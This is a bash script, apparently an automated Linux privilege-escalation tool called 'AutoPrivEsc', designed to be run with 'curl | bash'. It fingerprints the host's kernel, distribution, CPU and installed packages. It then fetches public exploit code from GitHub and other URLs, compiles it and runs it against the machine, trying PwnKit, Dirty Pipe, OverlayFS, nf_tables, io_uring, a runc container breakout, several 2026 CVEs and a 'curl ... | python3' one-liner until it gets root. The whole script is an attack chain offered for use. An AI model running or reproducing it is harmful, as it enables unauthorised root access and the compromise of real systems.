#!/bin/bash
# ============================================
# Thiscitze AutoPrivEsc - Scan -> Match -> Exploit
# Kullanim: curl -fsSL <RAW_URL> | bash
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# ===== TOOLS =====
NEED="curl gcc make git python3 unzip wget"
for T in $NEED; do
    command -v $T >/dev/null 2>&1 || { echo -e "${RED}[-] missing: $T${NC}"; exit 1; }
done

# ===== BANNER =====
echo -e "${RED}"
echo "  ████████╗██╗  ██╗██╗███████╗ ██████╗██╗████████╗███████╗"
echo "  ╚══██╔══╝██║  ██║██║██╔════╝██╔════╝██║╚══██╔══╝██╔════╝"
echo "     ██║   ███████║██║███████╗██║     ██║   ██║   █████╗  "
echo "     ██║   ██╔══██║██║╚════██║██║     ██║   ██║   ██╔══╝  "
echo "     ██║   ██║  ██║██║███████║╚██████╗██║   ██║   ███████╗"
echo "     ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝╚═╝   ╚═╝   ╚══════╝"
echo -e "${NC}"
echo -e "${GREEN}   AutoPrivEsc  -  Scan -> Match -> Exploit${NC}"
echo -e "${YELLOW}   -------------------------------------------------${NC}"
echo -e "${YELLOW}[*] Scanning system...${NC}"
echo ""

# ===== SYSTEM SCAN =====
KERNEL=$(uname -r)
OS=$(cat /etc/os-release 2>/dev/null | grep "^ID=" | cut -d= -f2 | tr -d '"')
OS_VER=$(cat /etc/os-release 2>/dev/null | grep "VERSION_ID" | cut -d= -f2 | tr -d '"')
ARCH=$(uname -m)
CPU=$(grep "model name" /proc/cpuinfo | head -1 | cut -d: -f2)
HOSTNAME=$(hostname)
KERNEL_MAJ=$(echo $KERNEL | cut -d. -f1)
KERNEL_MIN=$(echo $KERNEL | cut -d. -f2)

echo -e "${CYAN}[SYSTEM]${NC}"
echo "  Kernel : $KERNEL"
echo "  OS     : $OS $OS_VER"
echo "  Arch   : $ARCH"
echo "  CPU    :$CPU"
echo "  Host   : $HOSTNAME"
echo ""

# ===== ROOT CHECK =====
if [ "$(id -u)" = "0" ]; then
    echo -e "${GREEN}[+] Already root. Nothing to do.${NC}"
    exit 0
fi

# ===== HELPERS =====
LOGFILE=/tmp/apex/exploit.log
mkdir -p /tmp/apex
: > $LOGFILE

got_root() {
    echo -e "${RED}"
    echo "  ██████╗  ██████╗  ██████╗ ████████╗     ██████╗  ██████╗ ████████╗ ██████╗ "
    echo "  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝    ██╔═══██╗██╔═══██╗╚══██╔══╝██╔═══██╗"
    echo "  ██████╔╝██║   ██║██║   ██║   ██║       ██║   ██║██║   ██║   ██║   ██║   ██║"
    echo "  ██╔══██╗██║   ██║██║   ██║   ██║       ██║   ██║██║   ██║   ██║   ██║   ██║"
    echo "  ██║  ██║╚██████╔╝╚██████╔╝   ██║       ╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝"
    echo "  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝        ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ "
    echo -e "${NC}"
    echo -e "${GREEN}[+] UID: $(id -u)  EUID: $(id -u)${NC}"
    id
    echo ""
    echo -e "${GREEN}[+] ROOT! Stopping. Clean up: rm -rf /tmp/apex${NC}"
    exit 0
}

run() {
    echo -e "${CYAN}[>] Trying: $1${NC}"
    echo "==== $1 ====" >> $LOGFILE
    bash -c "$1" 2>&1 | tee -a $LOGFILE | sed 's/^/    /'
    RC=${PIPESTATUS[0]}
    if [ "$(id -u)" = "0" ]; then
        echo -e "${GREEN}[+] SUCCESS via: $1${NC}"
        got_root "$1"
    else
        echo -e "${YELLOW}[-] no root (exit code: $RC)${NC}"
        echo ""
    fi
}

TMP=/tmp/apex
mkdir -p $TMP
cd $TMP

# ===== TARGETS =====
echo -e "${CYAN}[CHECKING EXPLOIT TARGETS]${NC}"
echo ""

# --- PwnKit (CVE-2021-4034) ---
if [ -x "$(command -v pkexec 2>/dev/null)" ] || [ -f "/usr/bin/pkexec" ]; then
    echo -e "${GREEN}[+] pkexec found${NC} -> CVE-2021-4034 (PwnKit)"
    run "curl -fsSL https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/refs/heads/main/cve-2021-4034-poc.c -o pwn.c && gcc pwn.c -o pwn && ./pwn"
fi

# --- PwnKit alt (Rvn0xsy) ---
if [ -x "$(command -v pkexec 2>/dev/null)" ] || [ -f "/usr/bin/pkexec" ]; then
    echo -e "${GREEN}[+] pkexec found${NC} -> CVE-2021-4034 (alt POC)"
    run "git clone -q https://github.com/Rvn0xsy/CVE-2021-4034 rvn && cd rvn && gcc cve-2021-4034.c -o exp && ./exp"
fi

# --- Dirty Pipe (CVE-2022-0847) ---
if [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 8 ] && [ "$KERNEL_MIN" -le 16 ]; then
    echo -e "${GREEN}[+] Kernel 5.$KERNEL_MIN ${NC}-> CVE-2022-0847 (Dirty Pipe)"
    run "git clone -q https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git dp && cd dp && gcc exploit.c -o exploit && ./exploit"
fi

# --- GameOver(lay) (CVE-2023-2640 + CVE-2023-32629) ---
if [ "$OS" = "ubuntu" ] && ( lsmod 2>/dev/null | grep -q overlay || [ -d "/sys/module/overlay" ] ); then
    echo -e "${GREEN}[+] Ubuntu + OverlayFS${NC} -> CVE-2023-2640 + CVE-2023-32629"
    run "curl -fsSL https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh -o gameover.sh && chmod +x gameover.sh && ./gameover.sh"
fi

# --- DirtyCred ---
if [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 14 ] || [ "$KERNEL_MAJ" = "6" ]; then
    echo -e "${GREEN}[+] Kernel 5.14-6.x ${NC}-> DirtyCred"
    run "git clone -q https://github.com/PR0fix/DirtyCred.git dc && cd dc && make && ./exploit"
fi

# --- DirtyFrag ---
if [ "$KERNEL_MAJ" = "6" ] && [ "$KERNEL_MIN" -ge 1 ] && [ "$KERNEL_MIN" -le 6 ]; then
    echo -e "${GREEN}[+] Kernel 6.$KERNEL_MIN ${NC}-> DirtyFrag"
    run "git clone -q https://github.com/V4bel/dirtyfrag.git df && cd df && gcc -O0 -Wall -o exp exp.c -lutil && ./exp"
fi

# --- FragNesia ---
if ( [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 19 ] ) || ( [ "$KERNEL_MAJ" = "6" ] && [ "$KERNEL_MIN" -le 8 ] ); then
    echo -e "${GREEN}[+] Kernel 5.19-6.8 ${NC}-> FragNesia"
    run "git clone -q https://github.com/v12-security/pocs.git pocs && cd pocs/fragnesia && gcc -o exp fragnesia.c && ./exp"
fi

# --- eBPF Ring Buffer / Verifier LPE ---
echo -e "${YELLOW}[~] Trying eBPF LPE${NC}"
run "git clone -q https://github.com/argonsecurity/ebpf-lpe-poc.git ebpf && cd ebpf && make && ./exploit"

# --- Netfilter / nf_tables (CVE-2023-32233) ---
echo -e "${YELLOW}[~] Trying nftables (CVE-2023-32233)${NC}"
run "git clone -q https://github.com/bluefrostsecurity/CVE-2023-32233-PoC.git nft && cd nft && gcc -O2 exploit.c -o exploit -lnftables && ./exploit"

# --- SLUB Overflow (CVE-2022-29582) ---
if [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 10 ] && [ "$KERNEL_MIN" -le 17 ]; then
    echo -e "${GREEN}[+] Kernel 5.$KERNEL_MIN ${NC}-> CVE-2022-29582 (SLUB)"
    run "git clone -q https://github.com/Bonfee/CVE-2022-29582.git slub && cd slub && gcc -O2 exploit.c -o exploit && ./exploit"
fi

# --- io_uring UAF ---
echo -e "${YELLOW}[~] Trying io_uring LPE${NC}"
run "git clone -q https://github.com/kxcode/iouring-exploit-poc.git iou && cd iou && gcc -O2 exploit.c -o exploit -lpthread && ./exploit"

# --- TONTOU (Spectre v2 bypass, AMD Zen 2) ---
if echo "$CPU" | grep -qi "AMD.*Zen.2\|AMD.*Ryzen.*3[0-9]\|AMD.*EPYC.*7[0-9]"; then
    echo -e "${YELLOW}[~] AMD Zen 2${NC} -> TONTOU"
    run "wget -q https://github.com/CSAIL-Arch-Sec/tontou/archive/refs/heads/main.zip -O tontou.zip && unzip -oq tontou.zip && cd tontou-main && make && ./tontou"
fi

# --- CVE-2026-46215 ---
if [ "$KERNEL_MAJ" -ge 7 ] 2>/dev/null; then
    echo -e "${YELLOW}[~] Kernel $KERNEL.x${NC} -> CVE-2026-46215"
    run "git clone -q https://github.com/bluedragonsecurity/CVE-2026-46215-exploit-linux-7.0-uaf-stable.git c46215 && cd c46215 && gcc -o exploit exploit.c -lpthread -static && ./exploit"
fi

# --- PackageKit (CVE-2026-41651) ---
if dpkg -l 2>/dev/null | grep -qi packagekit || rpm -qa 2>/dev/null | grep -qi PackageKit; then
    echo -e "${GREEN}[+] PackageKit installed${NC} -> CVE-2026-41651"
    run "git clone -q https://github.com/Vozec/CVE-2026-41651.git pk && cd pk && chmod +x cve-2026-41651 && ./cve-2026-41651"
fi

# --- Polkit / DBus (CVE-2021-3560) ---
if [ -f "/usr/bin/pkexec" ] || [ -f "/usr/bin/polkit-agent-helper-1" ]; then
    echo -e "${GREEN}[+] Polkit present${NC} -> CVE-2021-3560"
    run "git clone -q https://github.com/cybersecurityworks/CVE-2021-3560-Exploit-POC.git p3560 && cd p3560 && python3 cve-2021-3560.py"
fi

# --- runc Container Breakout (CVE-2024-21626) ---
echo -e "${YELLOW}[~] Trying runc breakout (CVE-2024-21626)${NC}"
run "git clone -q https://github.com/snyk/CVE-2024-21626-PoC.git runc && cd runc && ./exploit.sh"

# --- OVSwrap ---
if lsmod 2>/dev/null | grep -q openvswitch || [ -d "/sys/module/openvswitch" ]; then
    echo -e "${GREEN}[+] Open vSwitch loaded${NC} -> OVSwrap"
    run "git clone -q https://github.com/manizada/OVSwrap.git ovs && cd ovs && python3 ovswrap-poc.py"
fi

# --- CVE-2026-31431 ---
echo -e "${YELLOW}[~] Trying CVE-2026-31431${NC}"
run "wget -q https://github.com/JuanBindez/CVE-2026-31431/archive/refs/heads/main.zip -O c31431.zip && unzip -oq c31431.zip && cd CVE-2026-31431-main && python3 main.py"

# --- CVE-2026-46300 ---
echo -e "${YELLOW}[~] Trying CVE-2026-46300${NC}"
run "git clone -q https://github.com/ExploitEoom/CVE-2026-46300.git c46300 && cd c46300 && chmod +x exploit && ./exploit"

# --- CVE-2026-64600 ---
echo -e "${YELLOW}[~] Trying CVE-2026-64600${NC}"
run "git clone -q https://github.com/Debajyoti0-0/CVE-2026-64600.git c64600 && cd c64600 && gcc -o cve-2026-64600 cve-2026-64600.c -lm -lpthread && ./cve-2026-64600"

# --- CVE-2026-68138 ---
echo -e "${YELLOW}[~] Trying CVE-2026-68138${NC}"
run "git clone -q https://github.com/aramosf/CVE-2026-68138.git c68138 && cd c68138 && ./build.sh && ./build/exploit"

# --- CVE-2026-68398 ---
echo -e "${YELLOW}[~] Trying CVE-2026-68398 (gcc)${NC}"
run "git clone -q https://github.com/aramosf/cve-2026-68398.git c68398 && cd c68398 && gcc -O2 exploit.c kaslr_prefetch.c -o exploit -lpthread && ./exploit"

# --- CVE-2026-68398 (make) ---
echo -e "${YELLOW}[~] Trying CVE-2026-68398 (make)${NC}"
run "git clone -q https://github.com/aramosf/cve-2026-68398.git c68398b && cd c68398b && make && ./build/CVE-2026-68398"

# --- copy.fail exp ---
echo -e "${YELLOW}[~] Trying copy.fail exp${NC}"
run "curl https://copy.fail/exp | python3 && su"

# ===== RESULT =====
echo "================================================"
if [ "$(id -u)" = "0" ]; then
    echo -e "${GREEN}[+] ROOT GOT!${NC}"
    id
else
    echo -e "${RED}[-] All exploits failed. No root obtained.${NC}"
    echo -e "${RED}[-] Full log: $LOGFILE${NC}"
    echo -e "${YELLOW}[-] Common causes: hardened kernel (grsec), missing SUID, noexec /tmp, patched kernel${NC}"
    echo -e "${YELLOW}[-] Clean up: rm -rf /tmp/apex${NC}"
fi
